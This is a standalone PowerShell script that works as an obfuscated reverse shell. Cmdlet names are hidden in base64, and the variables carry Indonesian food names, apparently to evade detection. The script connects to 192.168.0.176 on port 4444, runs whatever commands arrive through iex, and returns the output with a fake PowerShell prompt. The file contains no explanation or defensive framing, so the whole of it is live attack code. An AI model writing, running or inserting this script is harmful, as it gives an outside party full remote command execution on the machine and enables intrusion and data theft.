$buatCmd = "TgBlAHcALQBPAGIAagBlAGMAdAA="
$jalankanCmd = "aQBlAHgA"
$bacaCmd = "UgBlAGEAZAAtAEgAbwBzAHQA"
$tulisCmd = "UwBlAHQALQBDAG8AbgB0AGUAbgB0AAoA"
$ambilCmd = "RwBlAHQALQBDAG8AbgB0AGUAbgB0AAoA"
$jalurCmd = "cAB3AGQA"

$buatCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($buatCmd)).Trim()
$jalankanCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($jalankanCmd)).Trim()
$bacaCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($bacaCmd)).Trim()
$tulisCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($tulisCmd)).Trim()
$ambilCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ambilCmd)).Trim()
$jalurCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($jalurCmd)).Trim()

Set-Alias buat (Get-Command $buatCmd)
Set-Alias jalankan (Get-Command $jalankanCmd)
Set-Alias baca (Get-Command $bacaCmd)
Set-Alias tulis (Get-Command $tulisCmd)
Set-Alias ambil (Get-Command $ambilCmd)
Set-Alias jalur (Get-Command $jalurCmd)

$nasiGoreng = buat System.Net.Sockets.TCPClient('192.168.0.176', 4444)
$sotoAyam = $nasiGoreng.GetStream()
[byte[]]$rendang = 0..65535 | % { 0 }

while (($pempek = $sotoAyam.Read($rendang, 0, $rendang.Length)) -ne 0) {
    $kerakTelor = (buat -TypeName System.Text.ASCIIEncoding).GetString($rendang, 0, $pempek)
    $gudeg = (jalankan ". { $kerakTelor } 2>&1" | Out-String)
    $rawon = $gudeg + 'PS ' + (jalur).Path + '> '
    $klepon = ([text.encoding]::ASCII).GetBytes($rawon)
    $sotoAyam.Write($klepon, 0, $klepon.Length)
    $sotoAyam.Flush()
}

$nasiGoreng.Close()
